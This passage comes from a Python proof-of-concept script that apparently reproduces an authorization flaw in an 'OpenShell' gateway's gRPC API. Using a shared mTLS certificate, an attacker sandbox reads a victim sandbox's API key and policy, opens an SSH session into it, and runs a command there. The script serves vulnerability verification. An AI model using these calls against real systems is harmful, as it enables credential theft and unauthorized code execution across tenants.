id,title,username,language,date,content

    try:
        stub.Health(openshell_pb2.HealthRequest(), timeout=10)
    except grpc.RpcError as e:
        print(f""[!] Cannot reach gateway at {args.endpoint}: {e}"", file=sys.stderr)
        return 1
    print(f""[+] Connected to gateway at {args.endpoint}"")

    SECRET_KEY = ""sk-ant-SUPER-SECRET-KEY-12345""
    VICTIM_PROVIDER = ""repro-victim-provider""
    VICTIM_SANDBOX = ""repro-victim-sandbox""
    ATTACKER_SANDBOX = ""repro-attacker-sandbox""

    result = Result()

    try:
        # =================================================================
        # SETUP: Victim provider + sandbox (has secrets)
        # =================================================================
        delete_quietly(stub, VICTIM_PROVIDER, ""provider"")
        stub.CreateProvider(
            openshell_pb2.CreateProviderRequest(
                provider=datamodel_pb2.Provider(
                    name=VICTIM_PROVIDER,
                    type=""claude"",
                    credentials={""ANTHROPIC_API_KEY"": SECRET_KEY},
                )
            )
        )
        print(f""[+] Created victim provider '{VICTIM_PROVIDER}'"")
        print(f""    Secret: {SECRET_KEY}"")

        delete_quietly(stub, VICTIM_SANDBOX, ""sandbox"")
        victim_resp = stub.CreateSandbox(
            openshell_pb2.CreateSandboxRequest(
                name=VICTIM_SANDBOX,
                spec=datamodel_pb2.SandboxSpec(
                    policy=_default_policy(),
                    providers=[VICTIM_PROVIDER],
                ),
            )
        )
        victim_id = victim_resp.sandbox.id
        print(f""[+] Created victim sandbox '{VICTIM_SANDBOX}' (id: {victim_id})"")

        # =================================================================
        # SETUP: Attacker sandbox (no provider, separate identity)
        # =================================================================
        delete_quietly(stub, ATTACKER_SANDBOX, ""sandbox"")
        attacker_resp = stub.CreateSandbox(
            openshell_pb2.CreateSandboxRequest(
                name=ATTACKER_SANDBOX,
                spec=datamodel_pb2.SandboxSpec(policy=_default_policy()),
            )
        )
        attacker_id = attacker_resp.sandbox.id
        print(f""[+] Created attacker sandbox '{ATTACKER_SANDBOX}' (id: {attacker_id})"")
        print()

        # =================================================================
        # TEST 1: GetSandboxProviderEnvironment - no token
        #
        # Attacker uses the shared mTLS cert to read the victim's
        # provider credentials without any per-sandbox token.
        # =================================================================
        print(""="" * 64)
        print(""TEST 1: GetSandboxProviderEnvironment - no token"")
        print(f""  caller context  = attacker (shared mTLS cert)"")
        print(f""  target          = victim sandbox {victim_id}"")
        print(f""  x-sandbox-token = (none)"")
        print(""="" * 64)

        try:
            env_resp = stub.GetSandboxProviderEnvironment(
                openshell_pb2.GetSandboxProviderEnvironmentRequest(
                    sandbox_id=victim_id,
                )
            )
            env = dict(env_resp.environment)
            leaked = env.get(""ANTHROPIC_API_KEY"", """")
            detail = f""leaked ANTHROPIC_API_KEY={leaked}""
            print(f""\n  [!!] VULNERABLE - {detail}"")
            result.record(""GetSandboxProviderEnvironment (no token)"", ""VULNERABLE"", detail)
        except grpc.RpcError as e:
            result.record_rpc_error(""GetSandboxProviderEnvironment (no token)"", e)

        # =================================================================
        # TEST 2: GetSandboxProviderEnvironment - fabricated token
        #
        # Submits a UUID-format token that is not valid for any
        # sandbox. On unpatched servers, the header is ignored and
        # credentials are returned. On patched servers, the token
        # hash won't match and the call is rejected.
        #
        # NOTE: This is NOT a real cross-sandbox token replay.
        # The attacker's real OPENSHELL_SANDBOX_TOKEN is only
        # available inside the attacker pod and cannot be obtained
        # through the API. See the Limitations section in the
        # docstring for details.
        # =================================================================
        print()
        print(""="" * 64)
        print(""TEST 2: GetSandboxProviderEnvironment - fabricated token"")
        print(f""  caller context  = attacker (shared mTLS cert)"")
        print(f""  target          = victim sandbox {victim_id}"")
        print(f""  x-sandbox-token = (fabricated UUID, not valid for any sandbox)"")
        print(""="" * 64)

        fabricated_token = f""aaaaaaaa-bbbb-cccc-dddd-{attacker_id[:12]}""

        try:
            env_resp = stub.GetSandboxProviderEnvironment(
                openshell_pb2.GetSandboxProviderEnvironmentRequest(
                    sandbox_id=victim_id,
                ),
                metadata=[(""x-sandbox-token"", fabricated_token)],
            )
            env = dict(env_resp.environment)
            leaked = env.get(""ANTHROPIC_API_KEY"", """")
            detail = f""leaked ANTHROPIC_API_KEY={leaked}""
            print(f""\n  [!!] VULNERABLE - {detail}"")
            result.record(""GetSandboxProviderEnvironment (fabricated token)"", ""VULNERABLE"", detail)
        except grpc.RpcError as e:
            result.record_rpc_error(""GetSandboxProviderEnvironment (fabricated token)"", e)

        # =================================================================
        # TEST 3: GetSandboxPolicy - no token
        #
        # Attacker reads the victim's sandbox policy configuration.
        # GetSandboxPolicyRequest lives in sandbox_pb2 (not openshell_pb2).
        # =================================================================
        print()
        print(""="" * 64)
        print(""TEST 3: GetSandboxPolicy - no token"")
        print(f""  caller context  = attacker (shared mTLS cert)"")
        print(f""  target          = victim sandbox {victim_id}"")
        print(f""  x-sandbox-token = (none)"")
        print(""="" * 64)

        try:
            policy_resp = stub.GetSandboxPolicy(
                sandbox_pb2.GetSandboxPolicyRequest(
                    sandbox_id=victim_id,
                )
            )
            detail = f""policy version {policy_resp.version} disclosed""
            print(f""\n  [!!] VULNERABLE - {detail}"")
            result.record(""GetSandboxPolicy (no token)"", ""VULNERABLE"", detail)
        except grpc.RpcError as e:
            result.record_rpc_error(""GetSandboxPolicy (no token)"", e)

        # =================================================================
        # WRITE-SIDE TESTS: require sandbox pod to be Ready
        #
        # CreateSshSession and ExecSandbox check sandbox phase before
        # doing anything, so they return FAILED_PRECONDITION when the
        # pod is not running. With --wait-ready, we poll until the
        # sandbox controller has provisioned the pod.
        # =================================================================
        victim_ready = False
        if args.wait_ready:
            print()
            print(""="" * 64)
            print(f""WAITING for victim sandbox to reach Ready ""
                  f""(timeout {args.ready_timeout}s)"")
            print(""="" * 64)
            victim_ready = wait_for_sandbox_ready(
                stub, victim_id, timeout=args.ready_timeout,
            )
            if victim_ready:
                print(""  Victim sandbox is Ready."")
            else:
                print(""  Timed out. Write-side tests will be INCONCLUSIVE."")
        else:
            print()
            print(""[*] Skipping sandbox Ready wait (use --wait-ready to enable)"")

        # =================================================================
        # TEST 4: CreateSshSession - no token
        #
        # Attacker creates an SSH session into the victim's sandbox.
        # At the time of writing, CreateSshSession does NOT call
        # validate_sandbox_token(), so this RPC remains unprotected
        # even after the read-side fix.
        #
        # Source: crates/openshell-server/src/grpc.rs, fn create_ssh_session
        # =================================================================
        print()
        print(""="" * 64)
        print(""TEST 4: CreateSshSession - no token"")
        print(f""  caller context  = attacker (shared mTLS cert)"")
        print(f""  target          = victim sandbox {victim_id}"")
        print(f""  x-sandbox-token = (none)"")
        print(""="" * 64)

        try:
            ssh_resp = stub.CreateSshSession(
                openshell_pb2.CreateSshSessionRequest(
                    sandbox_id=victim_id,
                )
            )
            detail = (
                f""SSH session token issued: {ssh_resp.token[:16]}... ""
                f""(host={ssh_resp.gateway_host}:{ssh_resp.gateway_port})""
            )
            print(f""\n  [!!] VULNERABLE - {detail}"")
            result.record(""CreateSshSession (no token)"", ""VULNERABLE"", detail)

            stub.RevokeSshSession(
                openshell_pb2.RevokeSshSessionRequest(token=ssh_resp.token)
            )
        except grpc.RpcError as e:
            detail = f""{e.code().name}: {e.details()}""
            if e.code() in AUTHZ_CODES:
                print(f""\n  [OK] REJECTED by authorization - {detail}"")
                result.record(""CreateSshSession (no token)"", ""FIXED"", detail)
            elif e.code() == grpc.StatusCode.FAILED_PRECONDITION:
                print(f""\n  [??] INCONCLUSIVE - sandbox pod not running"")
                print(f""       {detail}"")
                if not args.wait_ready:
                    print(f""       Re-run with --wait-ready to wait for pod provisioning."")
                result.record(""CreateSshSession (no token)"", ""INCONCLUSIVE"", detail)
            else:
                print(f""\n  [??] INCONCLUSIVE - non-authz error"")
                print(f""       {detail}"")
                result.record(""CreateSshSession (no token)"", ""INCONCLUSIVE"", detail)

        # =================================================================
        # TEST 5: ExecSandbox - no token
        #
        # Attacker runs a command inside the victim's sandbox.
        # ExecSandbox does NOT call validate_sandbox_token(), so this
        # RPC remains unprotected even after the read-side fix.
        #
        # Source: crates/openshell-server/src/grpc.rs, fn exec_sandbox
        # =================================================================
        print()
        print(""="" * 64)
        print(""TEST 5: ExecSandbox - no token"")
        print(f""  caller context  = attacker (shared mTLS cert)"")
        print(f""  target          = victim sandbox {victim_id}"")
        print(f""  x-sandbox-token = (none)"")
        exec_cmd = [""hostname""]
        print(f""  command         = {exec_cmd}"")
        print(f""  expected output = '{VICTIM_SANDBOX}' (victim pod name)"")
        print(""="" * 64)

        try:
            events = stub.ExecSandbox(
                openshell_pb2.ExecSandboxRequest(
                    sandbox_id=victim_id,
                    command=exec_cmd,
                )
            )
            output_parts = []
